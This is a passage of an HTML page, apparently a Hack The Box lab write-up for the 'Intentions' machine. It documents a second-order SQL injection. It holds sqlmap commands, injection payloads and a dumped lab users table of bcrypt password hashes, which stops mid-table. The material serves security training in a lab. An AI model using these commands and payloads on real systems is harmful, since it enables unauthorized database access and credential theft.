@@ -1,0 +1,1133 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Intentions</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="26a783ed-ec69-4ed8-99ec-53c58dc94a67" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🥷</span></div><h1 class="page-title">Intentions</h1><p class="page-description"></p></header><div class="page-body"><p id="e189284e-0ff3-4305-966f-82f937131672" class="">The vulnerability is related to sqlinjection in the ‘genres’ post request</p><p id="7a106f0d-de6f-4343-ad3e-a83341f61973" class="">
+</p><p id="22d20579-55db-4412-8f3c-a973d6a57b03" class="">Here we are talking about a stored SQLi, everything that happens in the ‘profile’ page is reflected in the feed</p><p id="5d6759cf-c1eb-4633-8512-a8b26949e481" class="">
+</p><figure id="60e2cbc6-e8f0-4862-8a51-5772125f8420" class="image"><a href="Intentions%2026a783edec694ed899ec53c58dc94a67/Untitled.png"><img style="width:1905px" src="Intentions%2026a783edec694ed899ec53c58dc94a67/Untitled.png"/></a></figure><p id="d66b60e8-ca89-4ff0-9799-bc0c38992eda" class="">
+</p><p id="10a0eeb6-1583-45c2-a9b9-08d3c9e93f68" class="">
+</p><p id="2402addf-9ac3-4ace-8508-117ceccd1e63" class="">Additional to be a stored SQL there is a second order so we need to add the additional page</p><p id="ccfa1e16-1273-409f-8fab-166097c99bd5" class="">The command from sqlmap would be like this, where we stored the requests from burp for both the genres and the feed:</p><p id="39c45ef7-a01a-458f-810c-a2b164cf6bea" class="">
+</p><p id="780f056f-5057-4fa7-8b6a-722022abffa9" class="">Started with this command:</p><p id="8e1a1806-31ba-482c-ab49-59dfe3699862" class=""><code>sqlmap -r genres.txt --tamper=space2comment --second-req=feed.txt --technique=U</code></p><p id="08a654bb-ff56-44cd-b0f1-47acc5bb6644" class="">
+</p><p id="8007cbba-f550-4f70-955c-b5bbab872515" class="">Then repeated this one</p><p id="b25489bc-1c4b-4aa0-bffe-c8725fe467fe" class=""><code>sqlmap -r genres.txt --tamper=space2comment --second-req=feed.txt</code></p><p id="d484b4e9-8736-4a45-85e2-153336a50bed" class="">
+</p><p id="4b6e01c0-39df-48e3-a1e0-fbd14f4aaf9b" class="">And then dump the content of the entire DB</p><p id="a5a54285-3df5-4f54-8d01-32004c2589f0" class=""><code>sqlmap -r genres.txt --tamper=space2comment --second-req=feed.txt --dump</code></p><p id="0941782e-8fdb-4815-bc74-3cda502a56c4" class="">
+</p><p id="ee6ba52c-d3e5-4144-8166-5ee04ad68b07" class="">
+</p><p id="330aa47d-c7f4-4dd8-94cf-bc8f2fd82ff6" class="">The database name is intentions and the tables are</p><p id="51c824bc-b0ae-4f5c-a994-0ada2f019a5e" class=""><mark class="highlight-orange">gallery_images<br/>personal_access_tokens<br/>migrations<br/>users<br/></mark></p><p id="ca5750a3-83ca-45f2-923e-5240be6b2f28" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="662811e8-8ff0-4bf0-9304-cc2614ec31ec" class="code"><code class="language-Rust">┌─[us-release-1]─[10.10.14.23]─[htb-yougotgot@htb-xuhxy3t7h3]─[~]
+└──╼ [★]$ sqlmap -r genres.txt --tamper=space2comment --second-req=feed.txt --dump
+        ___
+       __H__
+ ___ ___[&quot;]_____ ___ ___  {1.6.12#stable}
+|_ -| . [,]     | .&#x27;| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:48:21 /2023-07-04/
+
+[19:48:21] [INFO] parsing HTTP request from &#x27;genres.txt&#x27;
+[19:48:21] [INFO] parsing second-order HTTP request from &#x27;feed.txt&#x27;
+[19:48:21] [INFO] loading tamper module &#x27;space2comment&#x27;
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+Cookie parameter &#x27;XSRF-TOKEN&#x27; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+Cookie parameter &#x27;token&#x27; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[19:48:26] [INFO] resuming back-end DBMS &#x27;mysql&#x27; 
+[19:48:26] [INFO] testing connection to the target URL
+[19:48:26] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON genres ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {&quot;genres&quot;:&quot;food,travel,nature&#x27;) AND 2386=2386 AND (&#x27;JHdF&#x27;=&#x27;JHdF&quot;}
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: {&quot;genres&quot;:&quot;food,travel,nature&#x27;) AND (SELECT 5840 FROM (SELECT(SLEEP(5)))nGWE) AND (&#x27;LxNW&#x27;=&#x27;LxNW&quot;}
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 7 columns
+    Payload: {&quot;genres&quot;:&quot;food,travel,nature&#x27;) UNION ALL SELECT NULL,CONCAT(0x716b787171,0x4962506e4d7a5945694c58726c466165694f7455694e6e6c77674f777458774a4e4f756657447259,0x716b7a7171),NULL,NULL,NULL#&quot;}
+---
+[19:48:26] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[19:48:26] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+[19:48:26] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[19:48:26] [INFO] fetching current database
+[19:48:26] [INFO] fetching tables for database: &#x27;intentions&#x27;
+[19:48:26] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;intentions&#x27;
+[19:48:26] [INFO] fetching entries for table &#x27;users&#x27; in database &#x27;intentions&#x27;
+[19:48:26] [WARNING] reflective value(s) found and filtering out
+Database: intentions
+Table: users
+[28 entries]
++----+--------------------------+-------+-------------------------------+---------------------------+--------------------------------------------------------------+---------------------+---------------------+
+| id | name                     | admin | email                         | genres                    | password                                                     | created_at          | updated_at          |
++----+--------------------------+-------+-------------------------------+---------------------------+--------------------------------------------------------------+---------------------+---------------------+
+| 1  | steve                    | 1     | steve@intentions.htb          | food,travel,nature        | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa | 2023-02-02 17:43:00 | 2023-02-02 17:43:00 |
+| 2  | greg                     | 1     | greg@intentions.htb           | food,travel,nature        | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m | 2023-02-02 17:44:11 | 2023-02-02 17:44:11 |
+| 3  | Melisa Runolfsson        | 0     | hettie.rutherford@example.org | food,travel,nature        | $2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 4  | Camren Ullrich           | 0     | nader.alva@example.org        | food,travel,nature        | $2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 5  | Mr. Lucius Towne I       | 0     | jones.laury@example.com       | food,travel,nature        | $2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 6  | Jasen Mosciski           | 0     | wanda93@example.org           | food,travel,nature        | $2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 7  | Monique D&#x27;Amore          | 0     | mwisoky@example.org           | food,travel,nature        | $2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 8  | Desmond Greenfelder      | 0     | lura.zieme@example.org        | food,travel,nature        | $2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 9  | Mrs. Roxanne Raynor      | 0     | pouros.marcus@example.net     | food,travel,nature        | $2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 10 | Rose Rutherford          | 0     | mellie.okon@example.com       | food,travel,nature        | $2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 11 | Dr. Chelsie Greenholt I  | 0     | trace94@example.net           | food,travel,nature        | $2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 12 | Prof. Johanna Ullrich MD | 0     | kayleigh18@example.com        | food,travel,nature        | $2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 13 | Prof. Gina Brekke        | 0     | tdach@example.com             | food,travel,nature        | $2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2. | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 14 | Jarrett Bayer            | 0     | lindsey.muller@example.org    | food,travel,nature        | $2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 15 | Macy Walter              | 0     | tschmidt@example.org          | food,travel,nature        | $2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 16 | Prof. Devan Ortiz DDS    | 0     | murray.marilie@example.com    | food,travel,nature        | $2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 17 | Eula Shields             | 0     | barbara.goodwin@example.com   | food,travel,nature        | $2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 18 | Mariano Corwin           | 0     | maggio.lonny@example.org      | food,travel,nature        | $2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 19 | Madisyn Reinger DDS      | 0     | chackett@example.org          | food,travel,nature        | $2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 20 | Jayson Strosin           | 0     | layla.swift@example.net       | food,travel,nature        | $2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
+| 21 | Zelda Jenkins            | 0     | rshanahan@example.net         | food,travel,nature        | $2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2 | 2023-02-02 18:02:37 | 2023-02-02 18:02:37 |
